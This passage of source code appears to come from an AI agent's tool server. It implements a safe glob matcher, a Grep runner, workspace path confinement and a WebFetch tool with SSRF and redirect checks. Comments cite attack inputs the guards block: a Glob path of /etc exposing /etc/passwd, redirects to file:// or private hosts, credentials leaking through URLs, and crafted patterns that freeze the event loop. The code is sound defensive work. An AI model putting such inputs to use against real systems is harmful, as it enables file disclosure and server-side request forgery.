        // error instead. Fail closed the same way an unclosed `[` or a
        // malformed segment already does elsewhere in this parser: a bracket
        // expression JS cannot compile becomes a token that matches no
        // character, ever — never a crash.
        let re
        try {
          re = new RegExp(`^${parsed.source}$`)
        } catch {
          tokens.push({ t: 'none' })
          i = parsed.next
          continue
        }
        tokens.push({ t: 'class', re, soleDot: parsed.soleDot })
        i = parsed.next
      } else {
        tokens.push({ t: 'lit', ch: '[' })
        i++
      }
    } else if (c === '{') {
      const close = findMatchingBrace(seg, i)
      if (close === -1) {
        tokens.push({ t: 'lit', ch: '{' })
        i++
      } else {
        const alts = splitTopLevelCommas(seg.slice(i + 1, close))
        tokens.push({ t: 'alt', options: alts.map(parseSegmentTokens) })
        i = close + 1
      }
    } else {
      tokens.push({ t: 'lit', ch: c })
      i++
    }
  }
  return tokens
}

/**
 * Advance a SET of reachable string offsets in `str` through one
 * {@link parseSegmentTokens} token, without backtracking:
 *   - `lit`/`any`/`class` consume exactly one character from each reachable
 *     offset (O(|reachable|) work — never more than `str.length` offsets are
 *     ever live at once, so this cannot blow up regardless of how the
 *     pattern is shaped).
 *   - `star` matches zero or more characters: once ANY offset is reachable,
 *     every LATER offset becomes reachable too, computed as a prefix-OR scan
 *     from the minimum reachable offset (the same trick {@link caseCheckPasses}
 *     already uses for `**` one level up, here per character) — O(str.length),
 *     never an inner retry loop.
 *   - `alt` (a `{a,b}` brace) tries each alternative from the WHOLE reachable
 *     set at once via a single nested {@link advanceTokens} call per option,
 *     and unions the results — bounded by (alternatives) × (that
 *     alternative's own cost), which is O(str.length) per option regardless
 *     of |reachable|, for the same reason `star` above is: `advanceToken` is
 *     a function that COMMUTES with set union (`f(A ∪ B) = f(A) ∪ f(B)` for
 *     every token type, `star` included — its output only depends on
 *     `min(reachable)`, and `min(A ∪ B) = min(min(A), min(B))`), so feeding
 *     an option the FULL reachable set in one call is provably identical to
 *     feeding it each singleton `{j}` separately and unioning — just without
 *     redoing the option's own O(str.length) work once per `j`.
 *
 *     #7898 round 3 — this used to loop `for (const j of reachable) { for
 *     (const option ...) { advanceTokens(option, str, new Set([j])) } }`,
 *     recomputing each option from scratch for every individual reachable
 *     offset. That is the same shape of accidental quadratic blowup the
 *     `star` fix above exists to avoid, just one level up: a segment built
 *     from L sequential `{*a,*b}`-shaped groups (an ordinary, unremarkable
 *     glob shape — `{*.ts,*.js}` is a completely normal pattern) pays
 *     O(|reachable|) = O(str.length) extra work at EVERY such group, because
 *     each group's own `*` re-expands reachable back to near-`str.length`
 *     before the next group starts. Measured on the un-batched version: a
 *     20×`{*a,*b}` pattern (140 chars) against a 5000-char non-matching real
 *     segment took 12.96 SECONDS; even bounded to a filesystem-realistic
 *     255-byte name, 100 sequential groups (a 700-char pattern, well within
 *     what an attacker can type — nothing upstream caps `pattern` length)
 *     already exceeded 100ms. `compileCaseCheck`/`caseCheckPasses` run
 *     SYNCHRONOUSLY per Glob match (up to `GLOB_COLLECT_CEILING` = 50,000 of
 *     them), after `runGlob`'s own walk-timeout race has already resolved —
 *     the exact single-threaded-event-loop-freeze shape `ccd677c4b` (this
 *     same PR, one commit up) replaced a backtracking RegExp to eliminate,
 *     reintroduced here through the one branch that still had an
 *     |reachable|-proportional term. Batching removes it: this function is
 *     now O(str.length) worst case for every token type, `alt` included.
 *
 * DOT GUARD (#7901) — see parseSegmentTokens's DOT HANDLING doc. `dotGuarded`
 * is true exactly when `str` (the REAL segment name being tested) starts with
 * a literal dot; the guard only ever changes behavior at offset 0, since
 * offset 0 becoming reachable at any LATER token means an earlier token
 * already legitimately consumed the leading dot, and every following
 * character is ordinary. It does not disturb the commutes-with-union property
 * the `alt` batching above relies on: whether 0 stays in a token's output
 * depends only on whether 0 was in its input, independent of anything else in
 * the set, so `f(A ∪ B) = f(A) ∪ f(B)` still holds token-type by token-type.
 */
function advanceToken(token, str, reachable) {
  const n = str.length
  const dotGuarded = n > 0 && str[0] === '.'
  if (token.t === 'star') {
    const next = new Set()
    let min = Infinity
    for (const j of reachable) {
      if (dotGuarded && j === 0) {
        next.add(0) // zero-width only — `*` may not cross the leading dot
        continue
      }
      if (j < min) min = j
    }
    if (min !== Infinity) { for (let j = min; j <= n; j++) next.add(j) }
    return next
  }
  const next = new Set()
  if (token.t === 'alt') {
    for (const option of token.options) {
      for (const end of advanceTokens(option, str, reachable)) next.add(end)
    }
    return next
  }
  // A `lit` token whose own character is '.' is always entitled to consume
  // offset 0; a `class` token is entitled only when parseBracketExpr flagged
  // it `soleDot` (the `[.]` exception — see its doc). Every other token type
  // (`any`, an ordinary `class`) is never entitled, matching `fs.glob`'s own
  // default of never letting a bare wildcard stand for a leading dot.
  const dotEntitled = token.t === 'lit' ? token.ch === '.' : token.t === 'class' && token.soleDot === true
  for (const j of reachable) {
    if (j >= n) continue
    if (j === 0 && dotGuarded && !dotEntitled) continue
    const c = str[j]
    if (token.t === 'lit' && c === token.ch) next.add(j + 1)
    else if (token.t === 'any') next.add(j + 1)
    else if (token.t === 'class' && token.re.test(c)) next.add(j + 1)
    // `t: 'none'` (a bracket expression `parseSegmentTokens` could not
    // compile to a RegExp — see its try/catch) intentionally matches no
    // branch above: it consumes nothing, ever, for any character. Fail
    // closed, on purpose, not an omission.
  }
  return next
}

/** Run a whole {@link parseSegmentTokens} token array through {@link advanceToken}, in order. */
function advanceTokens(tokens, str, startReachable) {
  let reachable = startReachable
  for (const token of tokens) {
    reachable = advanceToken(token, str, reachable)
    if (reachable.size === 0) return reachable
  }
  return reachable
}

/**
 * Does a {@link parseSegmentTokens} token array match `str` exactly, start to
 * end (case-sensitively — `lit` compares characters with `===`)? The safe,
 * non-backtracking replacement for `new RegExp(...).test(str)`.
 */
function segmentMatches(tokens, str) {
  const end = advanceTokens(tokens, str, new Set([0]))
  return end.has(str.length)
}

/**
 * Parse a `[...]` bracket expression starting at `seg[openIdx] === '['`.
 * Returns `null` (caller treats `[` as a literal) when there is no closing
 * `]` — the same "unmatched metachar is literal" rule glob implementations
 * use. A `]` immediately after `[` or `[!`/`[^` is a literal `]`, per POSIX.
 *
 * `soleDot` (#7901) — true exactly when this class is `[.]`: non-negated,
 * one member, that member a literal dot. Node's `fs.glob` gives this one
 * shape of bracket class the same "explicit dot" privilege as a bare literal
 * `.` (verified directly: `[.]env` matches a real `.env`), while every other
 * class — `[.a]`, `[a.]`, any negated class, `.` on a `-` end of a range —
 * does not, even when `.` is technically among the characters it accepts. See
 * parseSegmentTokens's DOT HANDLING doc and advanceToken's dot guard, which
 * is the only place this flag is read.
 */
function parseBracketExpr(seg, openIdx) {
  let j = openIdx + 1
  let negate = false
  if (seg[j] === '!' || seg[j] === '^') {
    negate = true
    j++
  }
  const start = j
  if (seg[j] === ']') j++
  while (j < seg.length && seg[j] !== ']') j++
  if (j >= seg.length) return null
  const body = seg.slice(start, j)
  if (body.length === 0) return null
  // '-' is left alone (ranges mean the same thing in a JS class); '^' and ']'
  // are escaped so an unlucky position (leading '^', an already-consumed
  // leading ']') can't be misread as class syntax.
  const classBody = body.replace(/\^/g, '\\^').replace(/\]/g, '\\]')
  return { source: `[${negate ? '^' : ''}${classBody}]`, next: j + 1, soleDot: !negate && body === '.' }
}

/** Index of the `}` matching `seg[openIdx] === '{'`, or -1 if unmatched. */
function findMatchingBrace(seg, openIdx) {
  let depth = 1
  let j = openIdx + 1
  while (j < seg.length) {
    if (seg[j] === '{') depth++
    else if (seg[j] === '}') { depth--; if (depth === 0) return j }
    j++
  }
  return -1
}

/** Split a `{a,b,c}` body on top-level commas (commas inside nested `{}` don't count). */
function splitTopLevelCommas(s) {
  const parts = []
  let depth = 0
  let start = 0
  for (let i = 0; i < s.length; i++) {
    if (s[i] === '{') depth++
    else if (s[i] === '}') depth--
    else if (s[i] === ',' && depth === 0) {
      parts.push(s.slice(start, i))
      start = i + 1
    }
  }
  parts.push(s.slice(start))
  return parts
}

/**
 * Sentinel distinguishing a `**` (globstar) pattern segment from a compiled
 * per-segment RegExp in {@link compileCaseCheck}'s `matchers` array. A Symbol
 * rather than the string `'**'` so it can never collide with a RegExp value.
 */
const CASE_CHECK_GLOBSTAR = Symbol('globstar')

/**
 * COMPLEXITY BOUND (#7898 round 4) — the worst-case cost of the whole
 * segment matcher (`compileCaseCheck` + the per-name matching it drives,
 * everything below this comment), stated once here rather than re-derived
 * per round. Every prior round of this PR's review (1 through 3) found a NEW
 * super-linear blow-up in this code; this is the bound that is supposed to
 * end that pattern, by covering every construct the matcher accepts, not
 * just the one a given round happened to fuzz.
 *
 * #7901 — this bound covers BOTH callers of the matcher: `caseCheckPasses`
 * (a full path's real segments, known up front — still exercised directly by
 * this file's own test suite) and `walkGlob`'s own per-directory-entry use of
 * `segmentMatches`, which is the SAME per-segment token-array DP, just
 * invoked incrementally as the walk discovers each real name instead of
 * post-hoc over an already-known path. The cost accounting below is
 * unchanged either way — it was always per-segment-matched, not tied to
 * which function happens to call it.
 *
 * Notation:
 *   P = `pattern.length` (the whole Glob pattern, all `/`-segments combined).
 *   N = length of one real on-disk path SEGMENT name (a single filename or
 *       directory name, not the whole path).
 *   D = number of path segments in one candidate match (path depth).
 *   M = number of real directory entries the matcher is invoked on for one
 *       Glob call — bounded above by `globMaxEntriesVisited()` (2,000,000 default)
 *       in `walkGlob`, or by `GLOB_COLLECT_CEILING` (50,000) for the matches
 *       `caseCheckPasses` is called on directly.
 *
 * Split into a one-time PARSE and a per-match MATCH phase:
 *
 * PARSE — `compileCaseCheck`, called exactly once per Glob call, by `runGlob`
 * before the walk starts, splits on `/` and parses each segment via
 * `parseSegmentTokens`. For every construct
 * except nested braces, parsing a segment is O(segment length) — brackets,
 * chained (non-nested) `{...}` groups, and runs of `*`/`?` all consume their
 * own text once, so summed across all segments this is O(P). Chain-nested
 * braces (`{a,{b,{c,d}}}`, extended to depth d) are the exception:
 * `findMatchingBrace` + `splitTopLevelCommas` re-scan the shrinking remainder
 * at EVERY nesting level, so parse cost for one chain is O(d × average
 * remaining length) = O(d²) when d is left unbounded (measured: 0.16ms at
 * d=10, 301.88ms at d=4000/30,890 chars — quadratic scaling confirmed). Since
 * d ≤ P/2 for any nesting shape, this is O(P²) unbounded, which is why
 * `globPatternComplexityReason` (tool-transforms.js) now caps BOTH P (2,000
 * chars) and nesting depth (32 levels) before any of this runs — bounding
 * either alone would work; both are cheap and the depth cap also closes the
 * separate stack-overflow hazard below. Under that cap, PARSE is O(P)
 * (32 is a constant multiplier).
 *
 * MATCH — the per-segment `segmentMatches` DP, invoked once per real
 * directory entry (≤ M times), whether via `caseCheckPasses`'s own path-level
 * DP that aligns pattern segments (including any number of `**`, at any
 * position) against a match's D real segments — O(S × D), where S is the
 * pattern's segment count (S ≤ P) — or via `walkGlob`'s equivalent
 * incremental frontier update, one real segment at a time, which does the
 * same S-segments-of-work per entry without ever materializing a full D-long
 * real-segments array. Within one aligned non-`**` segment,
 * `segmentMatches` walks that segment's token tree: `*`/`?`/bracket-class
 * tokens are O(N) each; a `{a,b}` token is O(N) PER OPTION, batched over the
 * whole reachable-offset set rather than per-offset (the round-3 fix,
 * `65831e075`) — without that batching, an `alt` token costs O(N ×
 * |reachable|) = O(N²) worst case, which is exactly what `65831e075` closed
 * (12.96s for 20×`{*a,*b}` against a 5000-char name, down to 9.41ms after).
 * Because `advanceToken` commutes with set union for every token type (see
 * its own doc), this batched cost is paid ONCE per token regardless of brace
 * nesting shape, and total token count across a whole segment (leaves plus
 * `alt` nodes, nested or chained) is bounded by that segment's own length —
 * so one `segmentMatches` call is O(segment length × N), and summed across a
 * pattern's segments, one `caseCheckPasses` call is O(P × N). Brace
 * alternatives inside a `**`-adjacent segment, or a segment sitting between
 * two `**`s, are ordinary segments to this accounting — `**` itself costs no
 * per-character work at all (`CASE_CHECK_GLOBSTAR` accepts any already-real
 * segment unconditionally). Across all M candidates: O(M × P × N). #7901 —
 * `walkGlob`'s own I/O is cheaper than this bound needs: each real directory
 * is `opendir`'d exactly ONCE regardless of how many entries it contains
 * (unlike the pre-#7901 `realSegmentNames`, deleted by this fix, which
 * `readdir`'d per PATH SEGMENT of every candidate — cached, but still
 * O(M × D) amortized); the walk's directory-open cost is O(number of real
 * directories under `realRoot` that are actually visited), which this
 * accounting does not need to charge against the matcher's own bound at all.
 *
 * TOTAL, under the complexity cap: O(P) one-time parse + O(M × P × N) match —
 * polynomial in every one of P, N, D, M, with no term left unbounded by an
 * attacker-controlled input.
 *
 * WHAT THE TIME BOUND DOES NOT COVER: `parseSegmentTokens` (parse) and
 * `advanceToken`/`advanceTokens` (match, the `alt` branch) are RECURSIVE, one
 * JS call frame per brace-nesting level, with no depth check of their own —
 * a CPU-cheap but deep enough pattern overflows the call stack
 * (`RangeError: Maximum call stack size exceeded`) before it overflows any
 * time budget. Measured on Node 22.23.2: parse survives to ~depth 5,505,
 * match only to ~depth 2,000 (fewer, shallower frames per level in the
 * mutually-recursive `advanceToken`/`advanceTokens` pair) — both far below
 * what P ≤ 2,000-with-no-depth-cap could otherwise reach, and both
 * environment-dependent (however much stack the caller already used before
 * reaching here), which is exactly why `globPatternComplexityReason`'s 32-
 * level depth cap exists as a SEPARATE check from the length cap rather than
 * relying on length alone to keep depth incidentally low.
 */

/**
 * #7355 — compile a whole Glob pattern into the pieces {@link caseCheckPasses}
 * needs: the pattern has no `/` inside a segment (patterns are always
 * `/`-delimited — `\` is rejected upstream), so it is split on `/` and each
 * segment compiled independently via {@link parseSegmentTokens}. A `**`
 * segment compiles to {@link CASE_CHECK_GLOBSTAR} instead of a token array —
 * it matches zero or more REAL path segments, which are, by construction,
 * always real Dirent names (a `**` carries no literal text of its own to
 * mismatch), so segments it absorbs need no case check at all.
 *
 * Any number of `**` segments is supported: {@link caseCheckPasses} aligns
 * `matchers` against a match's real segments with the standard array
 * wildcard-matching DP (the same shape as string wildcard matching, just one
 * path segment at a time instead of one character at a time), so it is never
 * ambiguous which real segments a `**` absorbed in the sense that matters
 * here — the DP considers every split and accepts if ANY of them makes the
 * whole pattern match. An earlier version special-cased "at most one `**`"
 * and failed closed (rejected every match) for two or more, which silently
 * dropped every match — including already-correctly-cased ones — for an
 * ordinary pattern shape like `packages/**\/src/**\/*.test.js`; verified
 * against origin/main pre-#7355 that the identical fixture returned both
 * matches there, so this was a regression #7355 introduced, not a pre-existing
 * limitation worth keeping.
 *
 * Empty and `.` segments are dropped before compiling: `fs.glob` normalizes
 * both away in what it actually returns (measured: `./src/*.ts` yields a
 * Dirent whose name/parentPath never mention the leading `.`; same for a
 * `.` in the middle, e.g. `src/./x.ts`, or an empty segment from `src//x.ts`)
 * — it echoes neither a `.` component nor an empty one in any match. Compiling
 * the pattern's OWN segment list unfiltered made `./src/*.ts` (3 segments:
 * `.`, `src`, `*.ts`) impossible to align with the real match's 2 segments
 * (`src`, `x.ts`), failing every match closed. `./`-prefixed patterns are
 * explicitly allowed (`globPatternEscapeReason` has no rule against a bare
 * `.` segment), so this was a real regression, not a theoretical one —
 * verified against origin/main pre-#7355 that `./src/*.ts` matched there.
 */
function compileCaseCheck(pattern) {
  const patSegs = pattern.split('/').filter((s) => s !== '' && s !== '.')
  const matchers = patSegs.map((s) => (s === '**' ? CASE_CHECK_GLOBSTAR : parseSegmentTokens(s)))
  return { matchers }
}

/**
 * Test a {@link compileCaseCheck} result against a match's REAL segment names,
 * via the classic wildcard-matching DP over arrays (not strings): `dp[j]` is
 * true when the matchers processed so far can align with the first `j` real
 * segments. A literal matcher consumes exactly one real segment (case-
 * sensitively, via {@link segmentMatches} — see its doc and
 * {@link parseSegmentTokens}'s for why this is a token-array DP and not a
 * `RegExp`); a {@link CASE_CHECK_GLOBSTAR} matcher can consume any number
 * (0..j), computed as a running OR (prefix-OR) rather than an inner loop.
 */
function caseCheckPasses(check, realSegments) {
  const { matchers } = check
  const n = realSegments.length
  let dp = new Array(n + 1).fill(false)
  dp[0] = true
  for (const matcher of matchers) {
    const next = new Array(n + 1).fill(false)
    if (matcher === CASE_CHECK_GLOBSTAR) {
      let seenTrue = false
      for (let j = 0; j <= n; j++) {
        seenTrue = seenTrue || dp[j]
        next[j] = seenTrue
      }
    } else {
      for (let j = 1; j <= n; j++) {
        next[j] = dp[j - 1] && segmentMatches(matcher, realSegments[j - 1])
      }
    }
    dp = next
  }
  return dp[n]
}

/**
 * The leading run of LITERAL directory segments in a glob pattern — the part
 * the caller named outright rather than asked the matcher to discover.
 *
 * `node_modules/**` → `node_modules`; `src/**\/*.ts` → `src`; `*.ts` → ''.
 * The final segment is excluded: it is the basename, and confinement of the
 * matches themselves covers it.
 */
function literalDirPrefix(pattern) {
  const segments = pattern.split('/')
  const literal = []
  for (let i = 0; i < segments.length - 1; i++) {
    if (/[*?[\]{}]/.test(segments[i])) break
    literal.push(segments[i])
  }
  return literal.join('/')
}

async function runGrep({ input, cwd, cwdRealCache, cwdCacheTtl, signal }) {
  const pattern = input?.pattern
  if (typeof pattern !== 'string' || pattern.length === 0) {
    return { content: 'EINVAL: pattern is required', isError: true }
  }
  const realRoot = await safeResolveRoot(input?.path, cwd, cwdRealCache, cwdCacheTtl)

  // Prefer ripgrep; fall back to grep. Both honor -i and -n. The if/then/else
  // (NOT `rg || grep`) keeps a no-match rg exit-1 from re-running the search
  // under grep (Copilot review on #4060). executeBash captures the exit code
  // (doesn't reject), so no `; true` mask is needed here. Builders are shared
  // with the docker-byok container Grep (#5882).
  const { ci, ln, globArg } = buildGrepArgs(input)
  const cmd = buildGrepCommand({ pattern, root: realRoot, ci, ln, globArg })

  const result = await executeBash({
    command: cmd,
    cwd: realRoot,
    signal,
    timeoutMs: 60_000,
    env: buildSafeBashEnv(),
  })
  // grep/rg both return exit 1 on "no matches" — that's not an error
  // for our purposes. Only exit 2+ or stderr-without-stdout signals an
  // actual failure.
  if (result.stderr && !result.stdout && result.exitCode !== 1) {
    return { content: `Grep failed: ${result.stderr.trim()}`, isError: true }
  }
  if (!result.stdout) return { content: `No matches for ${pattern}`, isError: false }
  return { content: result.stdout, isError: false }
}

/**
 * Validate that an optional `path` argument (for Glob/Grep search roots)
 * is inside the workspace cwd. Defaults to cwd when unset/empty. Returns
 * the realpath so the caller can pass it to bash safely (the spawned
 * shell uses the realpath, not the original symlinked alias).
 *
 * SECURITY: an earlier draft of this function only rejected literal `..`
 * sequences, which let `Glob { path: '/etc' }` and `Grep { path: '/etc' }`
 * search the entire filesystem and return /etc/passwd etc. Caught by
 * `/agent-review` on PR #4060 — see #4071. Now realpath-validates the
 * path through the same machinery the Read/Write/Edit tools use.
 */
async function safeResolveRoot(p, cwd, cwdRealCache, cwdCacheTtl) {
  if (typeof p !== 'string' || p.length === 0) return cwd
  // #6923 — pass the RAW path; see safeResolve for why pre-`resolve()` is unsafe
  // (lexical `..` collapse hides a symlink+`..` escape).
  const { valid, realPath, cwdReal } = await validateRawPathWithinCwd(
    p,
    cwd,
    cwdRealCache,
    cwdCacheTtl,
  )
  if (!valid) {
    throw Object.assign(
      new Error(`path outside workspace: ${p} resolves to ${realPath}, expected under ${cwdReal}`),
      { code: 'EACCES' },
    )
  }
  return realPath
}

const WEBFETCH_DEFAULT_TIMEOUT_MS = 30_000
const WEBFETCH_TIMEOUT_CEILING_MS = 120_000
const WEBFETCH_MAX_RAW_BYTES = 1_048_576       // 1 MB cap on body read from socket
const WEBFETCH_MAX_OUTPUT_CHARS = 100_000      // 100 KB cap on text returned to model
// #4132: undici's default redirect cap is 20. Ours is tighter so the
// model can't burn its turn on a redirect-loop honeypot — and we
// re-validate scheme + host on every hop, so the loop is also a
// per-hop SSRF gate, not just a count.
const WEBFETCH_MAX_REDIRECT_HOPS = 10

async function isHostAllowed(hostname) {
  if (process.env.CHROXY_WEBFETCH_ALLOW_PRIVATE === '1') return true
  if (typeof hostname !== 'string' || hostname.length === 0) return false
  // URL.hostname returns IPv6 literals WITH square brackets ('[::1]'),
  // and node:net isIP doesn't accept brackets. Strip them before the
  // isIP probe so legitimate public IPv6 URLs aren't all rejected as
  // unresolvable hostnames. (Caught by /agent-review on #4165 — #4166.)
  const probe = hostname.startsWith('[') && hostname.endsWith(']')
    ? hostname.slice(1, -1)
    : hostname
  if (isIP(probe)) return !isPrivateOrSpecialIp(probe)
  try {
    // Resolve ALL addresses (both families). A multi-A host that returns
    // a public IP plus a private IP would otherwise slip past with the
    // single-address default — `fetch` may then pick the private one.
    // Refuse if ANY resolved address is private/special. (Copilot review
    // on #4165.)
    const addresses = await dnsLookup(probe, { all: true })
    if (!Array.isArray(addresses) || addresses.length === 0) return false
    for (const { address } of addresses) {
      if (isPrivateOrSpecialIp(address)) return false
    }
    return true
  } catch {
    // Unresolvable host — refuse rather than letting fetch try.
    return false
  }
}

async function runWebFetch({ input, signal }) {
  const rawUrl = input?.url
  if (typeof rawUrl !== 'string' || rawUrl.length === 0) {
    return { content: 'EINVAL: url is required', isError: true }
  }
  const rawPrompt = input?.prompt
  if (typeof rawPrompt !== 'string' || rawPrompt.length === 0) {
    return { content: 'EINVAL: prompt is required', isError: true }
  }
  let parsed
  try {
    parsed = new URL(rawUrl)
  } catch {
    // #4159: do NOT echo rawUrl here — a URL that fails to parse can
    // still contain userinfo (e.g. `http://alice:hunter2@` fails the
    // host check) and any echo lands in conversation history.
    return { content: 'EINVAL: malformed url (could not be parsed as http(s))', isError: true }
  }
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
    return {
      content: `EINVAL: only http(s) URLs are supported (got ${parsed.protocol})`,
      isError: true,
    }
  }
  // #4133: strip user:pass@ userinfo before either echoing the URL back
  // to the model OR passing it to fetch(). Two reasons:
  //   1. The model's tool_result lands in conversation history and gets
  //      resent to the Anthropic API on the next turn — userinfo in the
  //      URL is a credential exfiltration path.
  //   2. Node fetch refuses URLs containing credentials outright with
  //      an error that itself echoes the credentialed URL, so even the
  //      failure path leaks. Stripping here turns the fetch into an
  //      unauthenticated request — the server may 401 / 403, which is
  //      surfaced cleanly without exposing the creds.
  // #4160: remember whether userinfo was present so the result header
  // can surface a `[userinfo stripped from ...]` marker — a silent strip
  // turns a downstream 401 into a mysterious failure that the model can't
  // diagnose. The marker is the design trade-off worth flagging.
  //
  // #4183: track input-URL strip and redirect-hop strip as SEPARATE flags
  // so the marker can say exactly where the credentials came from. The
  // pre-#4183 single `hadUserinfo` flag produced a marker adjacent to
  // `currentUrl` (which may be a redirect destination), so a reader
  // could plausibly think the marker referred to the displayed URL
  // even when the strip happened on the input or on an earlier hop.
  // Distinguishing the two sources keeps the marker honest in the
  // redirect-chain case without changing where it sits in the result.
  const inputHadUserinfo = Boolean(parsed.username || parsed.password)
  let redirectHadUserinfo = false
  if (inputHadUserinfo) {
    parsed.username = ''
    parsed.password = ''
  }

  const requested = Number(input?.timeout)
  const timeoutMs = Number.isFinite(requested) && requested > 0
    ? Math.min(requested, WEBFETCH_TIMEOUT_CEILING_MS)
    : WEBFETCH_DEFAULT_TIMEOUT_MS

  const ac = new AbortController()
  const timer = setTimeout(() => ac.abort(new Error('timeout')), timeoutMs)
  // Forward an external abort signal (session destroy) into our local
  // controller. If the signal is ALREADY aborted at entry, the listener
  // wouldn't fire — short-circuit so a destroyed session doesn't make an
  // outbound request.
  const onExternalAbort = () => ac.abort(signal.reason)
  if (signal) {
    if (signal.aborted) ac.abort(signal.reason)
    else signal.addEventListener('abort', onExternalAbort, { once: true })
  }

  try {
    // #4132: SSRF check on the initial URL. Done before any network
    // attempt so an attacker can't even confirm a private host is
    // listening on the chroxy host.
    if (!(await isHostAllowed(parsed.hostname))) {
      return {
        content:
          `EACCES: refusing to fetch private/loopback/link-local host (${parsed.hostname}). ` +
          'Set CHROXY_WEBFETCH_ALLOW_PRIVATE=1 to opt in (local dev only — this is an SSRF guard).',
        isError: true,
      }
    }

    // #4132: manual redirect handling so we can re-validate scheme +
    // host on every hop. `redirect: 'follow'` would otherwise honour an
    // attacker's redirect to file:// (well, undici would refuse it
    // with a vague network error) or to a private IP (which undici
    // happily follows).
    let res
    let currentUrl = parsed
    for (let hop = 0; hop <= WEBFETCH_MAX_REDIRECT_HOPS; hop++) {
      res = await fetch(currentUrl.toString(), {
        signal: ac.signal,
        redirect: 'manual',
        headers: { 'user-agent': 'chroxy-webfetch/1.0' },
      })
      if (res.status < 300 || res.status >= 400) break
      const loc = res.headers.get('location')
      // Drain the body so the connection can return to the pool.
      try { await res.body?.cancel() } catch { /* connection already torn down */ }
      if (!loc) {
        return { content: `WebFetch redirect ${res.status} with no Location header`, isError: true }
      }
      let nextUrl
      try {
        nextUrl = new URL(loc, currentUrl)
      } catch {
        return { content: `WebFetch refused redirect: malformed Location header`, isError: true }
      }
      // #4182 (Copilot review): a Location header can introduce
      // `user:pass@` userinfo on any hop. Strip it BEFORE the next fetch
      // — Node fetch refuses credentialed URLs with an error that echoes
      // the credentialed URL, which would then leak via the catch-all
      // `WebFetch failed: ${err.message}` path.
      // #4183: set `redirectHadUserinfo` (separate from `inputHadUserinfo`)
      // so the result marker can name where the credentials came from
      // rather than ambiguously claiming "userinfo stripped" next to a
      // URL that may not itself have carried any.
      if (nextUrl.username || nextUrl.password) {
        redirectHadUserinfo = true
        nextUrl.username = ''
        nextUrl.password = ''
      }
      if (nextUrl.protocol !== 'http:' && nextUrl.protocol !== 'https:') {
        // The Location header is attacker-controlled, so don't echo it
        // verbatim — that's a prompt-injection surface AND would leak
        // sensitive paths (e.g. file:///etc/passwd). Just report the
        // scheme. (Copilot review on #4165.)
        return {
          content: `WebFetch refused redirect scheme: only http(s) allowed (got ${nextUrl.protocol})`,
          isError: true,
        }
      }
      if (!(await isHostAllowed(nextUrl.hostname))) {
        return {
          content:
            `WebFetch refused redirect to private/loopback/link-local host (${nextUrl.hostname}). ` +
            'Set CHROXY_WEBFETCH_ALLOW_PRIVATE=1 to opt in.',
          isError: true,
        }
      }
      if (hop === WEBFETCH_MAX_REDIRECT_HOPS) {
        return {
          content: `WebFetch hit redirect cap: too many redirects (>${WEBFETCH_MAX_REDIRECT_HOPS} hops)`,
          isError: true,
        }
      }
      currentUrl = nextUrl
    }

    // Compute the marker AFTER the redirect loop so it reflects any
    // userinfo stripped on a hop (#4182 Copilot review). #4183: name the
    // SOURCE of the stripped credentials so the marker is unambiguous
    // when `currentUrl` is a redirect destination that didn't itself
    // carry userinfo. The four arms are mutually exclusive at the
    // boolean level; the cross case is a single combined message rather
    // than two stacked markers.
    const userinfoMarker = (() => {
      if (inputHadUserinfo && redirectHadUserinfo) {
        return ' [userinfo stripped from input URL and redirect Location]'
      }
      if (inputHadUserinfo) return ' [userinfo stripped from input URL]'
      if (redirectHadUserinfo) return ' [userinfo stripped from redirect Location]'
      return ''
    })()

    if (!res.ok) {
      return {
        content: `HTTP ${res.status} ${res.statusText} from ${currentUrl.toString()}${userinfoMarker}`,
        isError: true,
      }
    }

    const ctype = (res.headers.get('content-type') || '').toLowerCase()
    if (isBinaryContentType(ctype)) {
      return {
        content: `Unsupported content-type for WebFetch: ${ctype || 'unknown'} (binary content is not extracted to text).`,
        isError: true,
      }
    }

    // #4134: respect the declared charset rather than blindly utf-8.
    // Legacy sites still serve ISO-8859-1, Shift_JIS, GB2312, etc.; an
    // unconditional utf-8 decode produces mojibake that the model
    // can't reason about. Falls back to utf-8 when charset is missing,
    // unknown, or rejected by TextDecoder.
    const charset = pickCharset(ctype)
    const raw = await readBodyCapped(res, WEBFETCH_MAX_RAW_BYTES, charset)
    const isHtml = ctype.includes('text/html') || ctype.includes('application/xhtml')
    const text = isHtml ? stripHtmlToText(raw.text) : raw.text
    const { output, outputTruncated } = capOutput(text, WEBFETCH_MAX_OUTPUT_CHARS)

    // Distinct markers so the model can tell whether it lost data at the
    // socket (raw cap) or after HTML extraction (output cap). Output cap
    // takes precedence in the marker because that's the final visible cut.
    let marker = ''
    if (outputTruncated) {
      marker = `\n\n[truncated at output cap: ${WEBFETCH_MAX_OUTPUT_CHARS} chars]`
    } else if (raw.truncated) {
      marker = `\n\n[truncated at raw body cap: ${WEBFETCH_MAX_RAW_BYTES} bytes]`
    }

    return {
      content: `Prompt: ${rawPrompt}\nURL: ${currentUrl.toString()}${userinfoMarker}\n\n${output}${marker}`,
      isError: false,
    }
  } catch (err) {
    // ac.abort(reason) surfaces `reason` as the thrown error rather than
    // wrapping it in AbortError. The most reliable signal that we aborted
    // is the controller's signal.aborted state — message-string matching
    // misses arbitrary user-supplied reasons (e.g. "session destroyed").
    if (ac.signal.aborted) {
      return { content: `WebFetch timed out or aborted after ${timeoutMs}ms`, isError: true }
    }
    return { content: `WebFetch failed: ${err?.message || String(err)}`, isError: true }
  } finally {
    clearTimeout(timer)
    if (signal) signal.removeEventListener('abort', onExternalAbort)
  }
}

function isBinaryContentType(ctype) {
  if (!ctype) return false
  if (ctype.startsWith('text/')) return false
  if (ctype.includes('json') || ctype.includes('xml') || ctype.includes('javascript')
      || ctype.includes('yaml') || ctype.includes('+text')) return false
  return true
}

/**
 * Pick a TextDecoder-compatible charset label from a Content-Type header.
 * Returns 'utf-8' when missing, unparseable, or rejected by TextDecoder
 * (so the caller never has to handle a thrown constructor).
 */
function pickCharset(ctype) {
  if (!ctype) return 'utf-8'
  // Match `charset=foo` allowing quoted values per RFC 7231. Anchor on
  // a parameter-boundary (start-of-string or `;`) so a contrived header
  // like `text/html; xcharset=fakeout` can't have its tail matched and
  // mistaken for the real `charset` parameter. (#4162)
  const m = ctype.match(/(?:^|;)\s*charset\s*=\s*"?([\w.:+-]+)"?/i)
  if (!m) return 'utf-8'
  const label = m[1]
  try {
    // Constructor throws if the label is unknown to the WHATWG registry.
    // We only use the throw signal — `new TextDecoder(label)` itself is
    // not retained; the real decoder is built per-call in readBodyCapped.
    new TextDecoder(label)
    return label
  } catch {
    return 'utf-8'
  }
}

